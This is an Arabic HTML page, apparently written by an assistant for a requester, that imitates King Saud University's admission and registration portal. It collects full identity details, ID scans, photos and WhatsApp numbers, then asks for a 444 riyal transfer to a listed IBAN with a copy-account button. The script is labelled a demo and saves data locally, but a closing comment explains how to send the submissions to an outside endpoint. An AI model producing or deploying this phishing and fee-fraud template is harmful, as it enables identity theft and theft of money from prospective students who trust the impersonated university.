<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>بوابة القبول والتسجيل - جامعة الملك سعود</title>

  <!-- Open Graph (لظهور الصورة والوصف عند المشاركة) -->
  <meta property="og:title" content="بوابة القبول والتسجيل - جامعة الملك سعود">
  <meta property="og:description" content="التقديم الإلكتروني لجامعة الملك سعود — سجل الآن وتابع حالة قبولك.">
  <meta property="og:image" content="https://i.postimg.cc/VLtqHrYr/images-6.jpg">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">

  <!-- روابط أيقونات / خط -->
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

  <style>
    :root{
      --primary:#0b4f8a;
      --accent:#d4af37;
      --muted:#6b6b6b;
      --card:#ffffff;
      --bg:#f7f8fa;
      --radius:12px;
    }
    *{box-sizing:border-box;font-family:'Tajawal',sans-serif}
    html,body{height:100%;margin:0;background:var(--bg);color:#111}
    a{color:inherit;text-decoration:none}
    header{background:linear-gradient(135deg,var(--primary),#135ea5);padding:18px 12px;color:#fff;box-shadow:0 6px 18px rgba(11,79,138,0.12)}
    .container{max-width:1100px;margin:0 auto;padding:0 16px}
    .logo{display:flex;align-items:center;gap:12px}
    .logo img{width:70px;height:70px;border-radius:10px;object-fit:cover;border:2px solid rgba(255,255,255,0.12)}
    .logo-text h1{margin:0;font-size:20px}
    .logo-text p{margin:0;color:rgba(255,255,255,0.9);font-size:13px}
    nav ul{list-style:none;display:flex;gap:12px;margin:8px 0 0;padding:0}
    nav a{color:rgba(255,255,255,0.95);padding:8px 10px;border-radius:8px}
    nav a:hover{background:rgba(255,255,255,0.06)}
    .hero{padding:36px 0;text-align:center}
    .hero h2{margin:6px 0;font-size:28px;color:#fff}
    .hero p{margin:0;color:rgba(255,255,255,0.9)}

    /* services */
    .services{background:transparent;padding:18px 0}
    .service-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
    .card{background:var(--card);padding:18px;border-radius:12px;box-shadow:0 10px 30px rgba(11,79,138,0.06);text-align:center}
    .card .icon{font-size:28px;color:var(--primary);margin-bottom:10px}
    .card h3{margin:0 0 6px;font-size:18px}
    .card p{color:var(--muted);font-size:14px;margin:0 0 12px}
    .btn{background:var(--primary);color:#fff;padding:10px 16px;border:none;border-radius:10px;font-weight:700;cursor:pointer}
    .btn.ghost{background:transparent;color:var(--primary);border:1px solid rgba(11,79,138,0.12)}
    .hidden{display:none}

    /* form */
    .form-wrap{display:none;max-width:1000px;margin:20px auto;background:var(--card);padding:22px;border-radius:12px;box-shadow:0 12px 36px rgba(0,0,0,0.06)}
    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
    label{display:block;margin-bottom:6px;font-weight:700;color:var(--primary)}
    input,select,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #e6e6e6;margin-bottom:10px;font-size:14px}
    textarea{min-height:90px;resize:vertical}
    .files-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
    .submit-row{display:flex;gap:12px;justify-content:center;margin-top:12px}

    /* payment */
    .payment-wrap{display:none;max-width:760px;margin:20px auto;background:var(--card);padding:22px;border-radius:12px;box-shadow:0 12px 36px rgba(0,0,0,0.06);text-align:center}
    .payment-wrap input{max-width:420px;margin:8px auto;display:block}
    .copy-btn{background:var(--accent);color:#fff;padding:8px 12px;border-radius:8px;border:none;cursor:pointer;margin-right:8px}

    /* success */
    .success{display:none;max-width:760px;margin:20px auto;background:#e9f8ef;color:var(--primary);padding:22px;border-radius:12px;text-align:center;font-weight:700;box-shadow:0 8px 26px rgba(0,0,0,0.04)}

    @media(max-width:980px){
      .service-cards{grid-template-columns:1fr}
      .grid2{grid-template-columns:1fr}
      nav ul{flex-wrap:wrap}
      .hero h2{font-size:22px}
    }
  </style>
</head>
<body>

  <!-- header (احتفظنا بتصميمك الأصلي) -->
  <header>
    <div class="container" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap">
      <div style="display:flex;align-items:center;gap:14px">
        <div class="logo">
          <!-- احتفظ بنفس صورة الشعار المحلية لديك -->
          <img src="logo.png" alt="شعار جامعة الملك سعود" id="uniLogo">
        </div>
        <div class="logo-text">
          <h1>جامعة الملك سعود</h1>
          <p>بوابة القبول والتسجيل</p>
        </div>
      </div>

      <nav>
        <ul>
          <li><a href="#home">الرئيسية</a></li>
          <li><a href="#services">الخدمات</a></li>
          <li><a href="#contact">اتصل بنا</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <!-- hero -->
  <section id="home" class="hero">
    <div class="container">
      <h2>مرحباً بك في بوابة القبول والتسجيل</h2>
      <p>جامعة الملك سعود - نحو مستقبل أكاديمي مشرق</p>
    </div>
  </section>

  <!-- services -->
  <section id="services" class="services container">
    <h2 style="text-align:center;margin-bottom:14px;color:var(--primary)">خدمات القبول والتسجيل</h2>
    <div class="service-cards">
      <div class="card" id="inquiry-card">
        <div class="icon"><i class="fas fa-search"></i></div>
        <h3>الاستعلام عن القبول</h3>
        <p>استعلم عن حالة قبولك باستخدام رقم الهوية ورقم الجوال</p>
        <button class="btn" onclick="showInquiryForm()">استعلام</button>
      </div>

      <div class="card" id="apply-card">
        <div class="icon"><i class="fas fa-user-graduate"></i></div>
        <h3>تقديم طلب جديد</h3>
        <p>املأ نموذج التقديم الرسمي لجامعة الملك سعود (تجريبي)</p>
        <!-- زر التقديم الذي طلبت إضافته — يفتح النموذج -->
        <button class="btn" id="openApplyBtn">تقديم طلب جديد</button>
      </div>

      <div class="card">
        <div class="icon"><i class="fas fa-credit-card"></i></div>
        <h3>سداد الرسوم</h3>
        <p>بعد إرسال الطلب، سيتم تحويلك لصفحة السداد الرسمية</p>
        <button class="btn ghost" onclick="alert('سيظهر زر السداد بعد إتمام إرسال الطلب')">سداد</button>
      </div>
    </div>
  </section>

  <!-- forms (نموذج التقديم التفصيلي) -->
  <div class="form-wrap" id="applyFormWrap" aria-hidden="true">
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
      <div style="width:60px;height:60px;background:linear-gradient(135deg,var(--primary),#135ea5);display:flex;align-items:center;justify-content:center;color:#fff;border-radius:10px;font-weight:800">KSU</div>
      <div>
        <h3 style="margin:0;color:var(--primary)">نموذج تقديم — جامعة الملك سعود (تجريبي)</h3>
        <p style="margin:0;color:var(--muted);font-size:13px">املأ الحقول بدقة — النموذج يُستخدم للتجربة/عرض فقط (لا يُرسل لمؤسسة). بعد الإرسال سيظهر لك رقم جامعي مؤقت.</p>
      </div>
    </div>

    <form id="applicationForm">
      <!-- grid of fields -->
      <div class="grid2">
        <div>
          <label>الاسم الكامل (عربي)</label>
          <input name="fullNameAr" type="text" required placeholder="الاسم الرباعي بالعربية">
          <label>الاسم الكامل (English)</label>
          <input name="fullNameEn" type="text" required placeholder="Full name in English">
          <label>نوع الهوية</label>
          <select name="idType" required>
            <option value="">اختر...</option>
            <option value="national">هوية وطنية</option>
            <option value="iqama">إقامة</option>
            <option value="passport">جواز سفر</option>
          </select>
          <label>رقم الهوية / الإقامة</label>
          <input name="idNumber" type="text" required placeholder="مثال: 1012345678">
          <label>تاريخ الميلاد</label>
          <input name="birthDate" type="date" required>
          <label>الجنس</label>
          <select name="gender" required>
            <option value="">اختر...</option><option>ذكر</option><option>أنثى</option>
          </select>
          <label>الجنسية</label>
          <input name="nationality" type="text" required placeholder="مثال: السعودية">
          <label>المدينة</label>
          <input name="city" type="text" required>
          <label>العنوان كامل</label>
          <textarea name="address" placeholder="شارع - حي - رمز بريدي" required></textarea>
        </div>

        <div>
          <label>الجوال (واتساب)</label>
          <input name="phone" type="tel" required placeholder="+9665XXXXXXXX">
          <label>البريد الإلكتروني</label>
          <input name="email" type="email" required placeholder="example@mail.com">
          <label>المؤهل السابق</label>
          <select name="prevDegree" required>
            <option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option>
          </select>
          <label>سنة التخرج</label>
          <input name="gradYear" type="number" min="1900" max="2100" required>
          <label>المعدل التراكمي / النسبة</label>
          <input name="gpa" type="text" required placeholder="مثال: 4.00 أو 95%">
          <label>نظام الثانوية</label>
          <select name="highSchoolType"><option value="">اختر</option><option>نظام ثانوي عام</option><option>نظام دولي</option></select>
          <label>البرنامج/نوع الدراسة</label>
          <select name="studyType" required>
            <option value="">اختر</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option>
          </select>
        </div>
      </div>

      <!-- academic choices -->
      <div style="margin-top:8px">
        <div class="section-title">الرغبات الأكاديمية (اختر 3 رغبات حسب الأولوية)</div>
        <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-top:8px">
          <select name="choice1" required>
            <option value="">اختر الرغبة الأولى</option>
            <option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option><option>كلية الحقوق</option>
          </select>
          <select name="choice2" required>
            <option value="">اختر الرغبة الثانية</option>
            <option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option><option>كلية الحقوق</option>
          </select>
          <select name="choice3" required>
            <option value="">اختر الرغبة الثالثة</option>
            <option>كلية الطب</option><option>كلية الهندسة</option><option>كلية العلوم</option><option>كلية الآداب</option><option>كلية إدارة الأعمال</option><option>كلية الحاسبات وتقنية المعلومات</option><option>كلية الحقوق</option>
          </select>
        </div>
      </div>

      <!-- emergency + files -->
      <div style="margin-top:14px" class="grid2">
        <div>
          <label>اسم جهة الاتصال للطوارئ</label><input name="emergencyName" type="text" placeholder="اسم القريب" required>
          <label>صلة القرابة</label><input name="emergencyRelation" type="text" placeholder="أم/أب/أخ..." required>
          <label>هاتف الطوارئ</label><input name="emergencyPhone" type="tel" placeholder="+9665..." required>
        </div>
        <div>
          <label>رفع صورة الهوية / الإقامة (PDF/صورة)</label><input name="fileId" type="file" accept="image/*,application/pdf" required>
          <label>رفع الشهادة / السجل الأكاديمي</label><input name="fileCertificate" type="file" accept="image/*,application/pdf" required>
          <label>صورة شخصية واضحة</label><input name="filePhoto" type="file" accept="image/*" required>
        </div>
      </div>

      <div style="margin-top:12px">
        <label>ملاحظات إضافية</label>
        <textarea name="notes" placeholder="إن كان لديك معلومة تود إضافتها"></textarea>
      </div>

      <div style="margin-top:8px">
        <label><input name="agree" type="checkbox" required> أقر بأن جميع البيانات صحيحة وأنني المسؤول عن محتواها.</label>
      </div>

      <div class="submit-row">
        <button class="btn" type="submit" id="submitAppBtn">إرسال الطلب</button>
        <button class="btn ghost" type="reset">إعادة تعيين</button>
      </div>
    </form>
  </div>

  <!-- payment section (بعد الإرسال) -->
  <div class="payment-wrap" id="paymentWrap" aria-hidden="true">
    <h3 style="color:var(--primary);margin:0 0 8px">صفحة السداد (تجريبي)</h3>
    <p style="color:var(--muted);margin:0 0 12px">أدخل بيانات التحويل؛ بعد الإرسال ستتلقى تأكيد استلام (عرض تجريبي).</p>

    <label>رقم الحساب الذي حوّلت منه</label>
    <input id="payerAccount" placeholder="مثال: SA3380000984608016472540">
    <label>اسم المحول</label>
    <input id="payerName" placeholder="الاسم كما في البنك">
    <label>اسم البنك</label>
    <input id="bankName" value="الراجحي" readonly>
    <label>تاريخ العملية</label>
    <input id="paymentDate" type="date">
    <label>المبلغ (ريال)</label>
    <input id="amount" type="number" value="444" readonly style="text-align:center">
    <label>رفع إيصال الدفع</label>
    <input id="receiptFile" type="file" accept="image/*,application/pdf">
    <div style="margin-top:12px">
      <button class="copy-btn" onclick="copyAccountToClipboard('SA3380000984608016472540')">نسخ رقم الحساب الرسمي</button>
    </div>

    <div style="margin-top:14px" class="submit-row">
      <button class="btn" id="submitPaymentBtn">إرسال إثبات السداد</button>
    </div>
  </div>

  <!-- success -->
  <div class="success" id="finalSuccess">
    شكراً — تم استلام جميع بياناتك. سيتم التواصل معك عبر الواتساب أو الإيميل لإرسال الرقم الجامعي.
  </div>

  <!-- toast -->
  <div id="toast" class="toast" role="status" aria-live="polite" ></div>

  <script>
    /************************************************************************
     * ملاحظات أمنية مهمة:
     * - هذا نموذج "تجريبي" (SAFETY MODE): بيانات النماذج لا تُرسل فعليًا إلى بريد أو خادم خارجي.
     * - الكود يخزن الطلب محلياً (localStorage) ويمنع تقديم طلب آخر من نفس المتصفح.
     * - إن أردت ربطه بخدمة فعلية (Google Apps Script أو Formcarry) سأشرح لك خطوة التعطيل والتوصيل في تعليق أسفل الكود.
     ************************************************************************/

    const openApplyBtn = document.getElementById('openApplyBtn');
    const applyFormWrap = document.getElementById('applyFormWrap');
    const applicationForm = document.getElementById('applicationForm');
    const submitAppBtn = document.getElementById('submitAppBtn');
    const paymentWrap = document.getElementById('paymentWrap');
    const submitPaymentBtn = document.getElementById('submitPaymentBtn');
    const finalSuccess = document.getElementById('finalSuccess');
    const toast = document.getElementById('toast');
    const applyFormKey = 'ksu_demo_application_submitted';

    function showToast(msg, time=2200){
      toast.textContent = msg;
      toast.classList.add('show');
      setTimeout(()=> toast.classList.remove('show'), time);
    }

    // زر يفتح نموذج التقديم
    openApplyBtn.addEventListener('click', ()=> {
      // if already submitted, block
      if(localStorage.getItem(applyFormKey)){
        showToast('❌ أنت قدمت سابقاً — لا يمكن التقديم مرتين من نفس الجهاز');
        return;
      }
      applyFormWrap.style.display = 'block';
      applyFormWrap.scrollIntoView({behavior:'smooth'});
    });

    // عملية التقديم: تحقق محلي ثم حفظ (تجريبي)، عرض صفحة السداد
    applicationForm.addEventListener('submit', function(e){
      e.preventDefault();
      // منع إعادة الإرسال إذا سبق التقديم (من هذا المتصفح)
      if(localStorage.getItem(applyFormKey)){
        showToast('❌ تم تقديم طلب سابقاً');
        return;
      }

      // تحقق من الحقول الأساسية (HTML validation يكفي غالباً) — نتحقق من عدم وجود قيم افتراضية قصيرة
      const fd = new FormData(applicationForm);
      const required = ['fullNameAr','fullNameEn','idType','idNumber','birthDate','gender','nationality','city','address','phone','email','prevDegree','gradYear','gpa','studyType','choice1','choice2','choice3','emergencyName','emergencyRelation','emergencyPhone'];
      for(const name of required){
        const v = fd.get(name);
        if(!v || String(v).trim().length < 2){
          showToast('❌ يرجى تعبئة جميع الحقول المطلوبة بشكل صحيح');
          return;
        }
      }

      // تأكيد رفع الملفات
      const fId = applicationForm.querySelector('[name="fileId"]').files.length;
      const fCert = applicationForm.querySelector('[name="fileCertificate"]').files.length;
      const fPhoto = applicationForm.querySelector('[name="filePhoto"]').files.length;
      if(!fId || !fCert || !fPhoto){
        showToast('❌ يرجى إرفاق جميع الملفات المطلوبة');
        return;
      }

      // توليد رقم تقديم مؤقت و\"رقم جامعي\" وهمي لعرض النجاح
      const appId = 'APP-' + Date.now().toString(36).slice(-8).toUpperCase();
      const studentNumber = 'KSU' + Math.floor(100000 + Math.random()*900000);

      // اجمع بيانات لعرض/حفظ محلي
      const entry = { appId, studentNumber, submittedAt: new Date().toISOString(), form: {} };
      for(const [k,v] of fd.entries()){
        // لا نخزن الملفات نفسها — نخزن أسماء الملفات فقط كعرض
        entry.form[k] = v instanceof File ? v.name : v;
      }
      // ملفات
      entry.files = {
        fileId: applicationForm.querySelector('[name="fileId"]').files[0].name,
        fileCertificate: applicationForm.querySelector('[name="fileCertificate"]').files[0].name,
        filePhoto: applicationForm.querySelector('[name="filePhoto"]').files[0].name
      };

      // حفظ محلي (تجريبي)
      localStorage.setItem('ksu_demo_application_' + appId, JSON.stringify(entry));
      // علامة أنه تم التقديم من هذا المتصفح (منع إعادة التقديم)
      localStorage.setItem(applyFormKey, JSON.stringify({appId, studentNumber}));

      // إظهار رسالة نجاح مؤقتة وعرض صفحة السداد
      showToast('✅ تم قبول بياناتك مبدئياً، جاري تحويلك لصفحة السداد...');
      applicationForm.reset();
      applyFormWrap.style.display = 'none';
      paymentWrap.style.display = 'block';
      paymentWrap.scrollIntoView({behavior:'smooth'});

      // ضع info مؤقتة على paymentWrap (مثال)
      // يمكنك استعمال studentNumber لاحقاً لإرسال البريد (إن ربطت نظاماً)
      console.log('تم حفظ طلب تجريبي:', entry);
    });

    // نسخ رقم الحساب الرسمي
    function copyAccountToClipboard(text){
      try{
        navigator.clipboard.writeText(text);
        showToast('✅ تم نسخ رقم الحساب');
      }catch(e){
        showToast('❌ فشل النسخ — انسخ يدوياً: ' + text);
      }
    }

    // إرسال إثبات السداد (تجريبي)
    submitPaymentBtn.addEventListener('click', function(){
      const payerAccount = document.getElementById('payerAccount').value.trim();
      const payerName = document.getElementById('payerName').value.trim();
      const paymentDate = document.getElementById('paymentDate').value;
      const amount = document.getElementById('amount').value;
      const receiptFile = document.getElementById('receiptFile').files.length;

      if(!payerAccount || !payerName || !paymentDate || !amount || !receiptFile){
        showToast('❌ يرجى إكمال بيانات السداد وإرفاق الإيصال');
        return;
      }

      // حفظ إثبات سداد محلي (تجريبي)
      const feeId = 'FEE-' + Date.now().toString(36).slice(-8).toUpperCase();
      const feeEntry = {
        feeId, payerAccount, payerName, paymentDate, amount,
        receiptFileName: document.getElementById('receiptFile').files[0].name,
        at: new Date().toISOString()
      };
      localStorage.setItem(feeId, JSON.stringify(feeEntry));

      // عرض رسالة النجاح النهائية وإخفاء السداد وعدم السماح بإرسال جديد
      paymentWrap.style.display = 'none';
      finalSuccess.style.display = 'block';
      finalSuccess.scrollIntoView({behavior:'smooth'});

      showToast('✅ تم إرسال إثبات السداد (تجريبي) — شكراً');

      // قفل زر التقديم نهائياً (بما أن لدينا applyFormKey)
      // (الخيار قائم: user الذي قدم سابقاً لا يستطيع تقديم مرة أخرى من نفس المتصفح)
    });

    // دالة فتح الفورم استعلام (مثال بسيط)
    function showInquiryForm(){
      alert('نموذج الاستعلام غير مفعل في النسخة التجريبية. استخدم زر تقديم لتجربة الإرسال.');
    }

    // إن أردت تفريغ بيانات التجربة على هذا المتصفح استعمل:
    // localStorage.removeItem('ksu_demo_application_submitted');
    // أو افتح DevTools -> Storage -> localStorage وامسح المفاتيح.

  </script>

  <!--
    ----- ملاحظة للربط الفعلي (اختياري، تنفيذي لاحقاً على مسؤوليتك) -----
    إن رغبت لاحقاً أن تُرسل البيانات فعلياً إلى بريدك أو Google Sheet:
    - أنشئ Google Apps Script web app أو استخدم خدمة Formcarry/Formspree.
    - في مكان التعليق هذا استبدل سلوك التطبيق الذي يخزّن محلياً
      بإرسال FormData إلى endpoint الخاص بك (fetch to your apps script URL).
    - تأكد من حصولك على موافقة/تصريح لاستخدام أي بيانات شخصية، وضرورة
      حماية نقلها عبر HTTPS وتخزينها بصورة قانونية وآمنة.
    (لا أقوم بتفعيل الإرسال الفعلي تلقائياً لأسباب أمان وامتثال.)
  -->

</body>
      </html>
